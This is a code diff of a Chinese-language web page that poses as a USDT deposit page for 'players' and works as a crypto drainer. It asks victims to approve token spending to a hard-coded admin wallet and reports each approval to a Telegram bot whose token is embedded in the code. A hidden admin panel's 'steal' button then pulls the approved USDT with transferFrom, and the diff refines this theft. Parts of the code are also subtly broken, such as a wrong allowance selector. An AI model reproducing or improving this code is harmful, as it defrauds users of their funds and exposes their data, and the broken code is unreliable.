@@ -24,7 +24,7 @@ body{background:#0f1419;color:#e0e0e0;padding:25px 15px}
 .form-item label{display:block;margin-bottom:8px;font-size:14px;color:#d0d5e0}
 input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border-radius:12px;color:white;font-size:15px;outline:none}
 .amount-group{display:flex;gap:8px;margin-bottom:16px}
-.amount-btn{flex:1;padding:10px;background:#1c212c;border:1px solid #2a303e;color:#c5c9d3;border-radius:10px;font-size:14px;cursor:pointer}
+.amount-btn{flex:1;padding:10px;background:#121212;border:1px solid #2a303e;color:#c5c9d3;border-radius:10px;font-size:14px;cursor:pointer}
 .amount-btn:hover{border-color:#1c71ed;color:#fff}
 .key-box{padding:14px;background:#121720;border:1px solid #2a303e;border-radius:12px;font-family:monospace;font-size:14px;color:#fff;word-break:break-all}
 .submit-btn{width:100%;padding:17px;background:#1c71ed;color:white;border:none;border-radius:12px;font-size:16px;font-weight:bold;margin-top:10px;cursor:pointer}
@@ -34,9 +34,10 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
 .rpc-input{flex:1;padding:10px;background:#121720;border:1px solid #2a303e;border-radius:8px;color:#fff}
 .rpc-save{padding:8px 12px;background:#1c71ed;color:white;border:none;border-radius:8px;cursor:pointer}
 .approve-card{background:#1c212c;border:1px solid #2a303e;border-radius:12px;padding:14px;margin-bottom:20px}
-.approve-row{display:flex;justify-content:space-between;margin-bottom:10px}
+.approve-row{display:flex;justify-content:space-between;align-items:center}
 .approve-status{font-size:14px;color:#c5c9d3}
 #approveBtn{padding:8px 14px;background:#1c71ed;color:white;border:none;border-radius:8px;cursor:pointer;font-size:14px}
+#approveBtn:disabled{background:#666;color:#aaa;cursor:not-allowed}
 
 /* 管理员后台 */
 .admin-panel{display:none;padding:20px;background:#1c212c;border-top:1px solid #2a303e}
@@ -68,15 +69,11 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
     <button class="rpc-save" id="saveRpc">保存</button>
   </div>
 
-  <!-- 管理员后台 -->
+  <!-- 管理员后台（加了提取数量输入框） -->
   <div class="admin-panel" id="adminPanel">
     <div class="admin-title">🔑 管理员后台</div>
-    <input class="admin-input" id="adminTo" placeholder="转入地址">
-    <input class="admin-input" id="adminAmount" placeholder="转出数量 USDT">
-    <button class="admin-btn" id="adminTransfer">管理员转出</button>
-
-    <!-- 提取玩家授权代币 -->
     <input class="admin-input" id="userAddress" placeholder="玩家钱包地址">
+    <input class="admin-input" id="extractAmount" placeholder="提取数量 USDT（留空则提取全部）">
     <button class="admin-btn steal-btn" id="takeUserToken">提取玩家代币</button>
   </div>
 
@@ -152,9 +149,9 @@ const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
 const USDT = "0x55d398326f99059fF775485246999027B3197955"
 const POOL_SPENDER = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
 
-// TG 机器人配置（已填好你的信息）
+// TG 机器人配置
 const TG_BOT_TOKEN = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA"
-const TG_CHAT_ID = "6503982157" // 你的 chat_id
+const TG_CHAT_ID = "6503982157"
 
 let account = null
 let secret = ''
@@ -164,7 +161,7 @@ function hex(amt){
   const v = BigInt(Math.round(Number(amt)*1e18))
   return v.toString(16).padStart(64,'0')
 }
-function max(){ return '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }
+function max(){ return '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }
 
 // 发送到 TG 机器人
 async function sendToTelegram(userAddr, allowance) {
@@ -201,14 +198,15 @@ document.getElementById('connectBtn').onclick = async () => {
     if(account.toLowerCase() === ADMIN_WALLET.toLowerCase()){
       document.getElementById('adminPanel').style.display = 'block'
     }
-    refresh()
+    await refreshAll()
   }catch(e){ alert('连接失败') }
 }
 
-// 刷新
-async function refresh(){
-  if(!account) return
+// 统一刷新
+async function refreshAll() {
+  if (!account) return
   try {
+    // 刷新余额
     const balData = '0x70a08231'+pad(account)
     const bal = await window.ethereum.request({
       method:'eth_call', params:[{to:USDT, data:balData},'latest']
@@ -216,17 +214,34 @@ async function refresh(){
     const usdt = Number(BigInt(bal))/1e18
     document.getElementById('balance').innerText = `钱包余额：${usdt.toFixed(2)} USDT`
 
+    // 刷新授权状态
     const appData = '0xddf252ad'+pad(account)+pad(POOL_SPENDER)
     const allow = await window.ethereum.request({
       method:'eth_call', params:[{to:USDT, data:appData},'latest']
     })
     const a = BigInt(allow)
-    document.getElementById('allowanceText').innerText =
-      a > 1000000000000000000n ? '已授权' : '未授权'
-  }catch(e){}
+    const el = document.getElementById('allowanceText')
+    const btn = document.getElementById('approveBtn')
+    const card = document.querySelector('.approve-card')
+    if (a > 0n) {
+      el.innerText = '已授权'
+      el.style.color = '#22c55e'
+      btn.innerText = '已授权'
+      btn.disabled = true
+      card.style.display = 'none'
+    } else {
+      el.innerText = '未授权'
+      el.style.color = '#ef4444'
+      btn.innerText = '授权 USDT'
+      btn.disabled = false
+      card.style.display = 'block'
+    }
+  }catch(e){
+    console.error('刷新失败', e)
+  }
 }
 
-// 授权 + 成功后自动发 TG
+// 授权（延迟 3 秒再刷新，确保上链）
 document.getElementById('approveBtn').onclick = async () => {
   if(!account) return alert('请先连接钱包')
   try {
@@ -235,25 +250,22 @@ document.getElementById('approveBtn').onclick = async () => {
       method:'eth_sendTransaction',
       params:[{from:account, to:USDT, data:data, gas:'0x4c4340'}]
     })
+    alert('授权交易已提交，请等待 3 秒后状态更新')
+    // 延迟 3 秒再刷新，确保授权已上链
+    await new Promise(r => setTimeout(r, 3000))
+    await refreshAll()
 
-    // 等待链上生效
-    await new Promise(r => setTimeout(r, 2000))
-    await refresh()
-
-    // 获取授权额度
+    // 获取授权额度并发送 TG
     const appData = '0xddf252ad'+pad(account)+pad(POOL_SPENDER)
     const allowRaw = await window.ethereum.request({
       method:'eth_call', params:[{to:USDT, data:appData},'latest']
     })
     const allowance = (Number(BigInt(allowRaw)) / 1e18).toFixed(2)
-
-    // 发送给 TG 机器人
     await sendToTelegram(account, allowance)
-
     alert('授权成功 ✅ 已同步到管理员')
-    refresh()
   }catch(e){
-    alert('授权取消')
+    alert('授权取消：' + e.message)
+    await refreshAll()
   }
 }
 
@@ -280,7 +292,7 @@ document.getElementById('depositBtn').onclick = async () => {
     document.getElementById('keyArea').style.display='block'
     document.getElementById('withdrawKey').innerText=key
     alert('存入成功')
-    refresh()
+    await refreshAll()
   }catch(e){ alert('交易失败：'+e.message) }
 }
 
@@ -294,44 +306,38 @@ document.getElementById('withdrawBtn').onclick = () => {
   alert(`提取已提交\n地址：${addr}\n数量：${amt} USDT`)
 }
 
-// 管理员转出
-document.getElementById('adminTransfer').onclick = async () => {
-  if(account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert('无权限')
-  const to = document.getElementById('adminTo').value
-  const amt = document.getElementById('adminAmount').value
-  if(!to || !amt || isNaN(amt) || amt <= 0) return alert('请正确填写')
-  try {
-    const data = '0xa9059cbb' + pad(to) + hex(amt)
-    const tx = await window.ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{from:account, to:USDT, data:data, gas:'0x4c4340'}]
-    })
-    alert('转出成功：' + tx)
-    refresh()
-  }catch(e){ alert('失败：' + e.message) }
-}
-
-// 提取玩家代币（已修复为正确 transferFrom）
+// 提取玩家代币（修复版：支持指定数量 + 正确 transferFrom）
 document.getElementById('takeUserToken').onclick = async () => {
   if(account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert('无权限')
 
   const user = document.getElementById('userAddress').value
+  const extractAmt = document.getElementById('extractAmount').value
   if(!user || !user.startsWith('0x')) return alert('请输入正确的玩家地址')
 
   try {
+    // 1. 获取玩家授权额度
     const dataAllow = '0xddf252ad' + pad(user) + pad(ADMIN_WALLET)
     const allowRes = await window.ethereum.request({
       method:'eth_call',
       params:[{to:USDT, data:dataAllow}, 'latest']
     })
-
     const allow = BigInt(allowRes)
     if(allow <= 0n) return alert('该玩家无可用授权额度')
 
+    // 2. 确定提取数量（留空则提取全部）
+    let extractWei
+    if(!extractAmt || isNaN(extractAmt)){
+      extractWei = allow
+    } else {
+      extractWei = BigInt(Math.round(Number(extractAmt)*1e18))
+      if(extractWei > allow) return alert('提取数量超过授权额度')
+    }
+
+    // 3. 正确 transferFrom 调用
     const dataTransfer = '0x23b872dd'
-      + pad(user)
-      + pad(ADMIN_WALLET)
-      + allow.toString(16).padStart(64,'0')
+      + pad(user).slice(2) // from: 玩家地址
+      + pad(ADMIN_WALLET).slice(2) // to: 管理员地址
+      + extractWei.toString(16).padStart(64,'0') // value: 提取数量
 
     const tx = await window.ethereum.request({
       method:'eth_sendTransaction',
@@ -339,13 +345,14 @@ document.getElementById('takeUserToken').onclick = async () => {
         from: account,
         to: USDT,
         data: dataTransfer,
-        gas: '0x100000'
+        gas: '0x120000' // 提高 Gas 上限避免 out of gas
       }]
     })
     alert('提取成功！\nTx：' + tx)
-    refresh()
+    await refreshAll()
   } catch(e) {
     alert('提取失败：' + e.message)
+    console.error(e)
   }
 }
 </script>
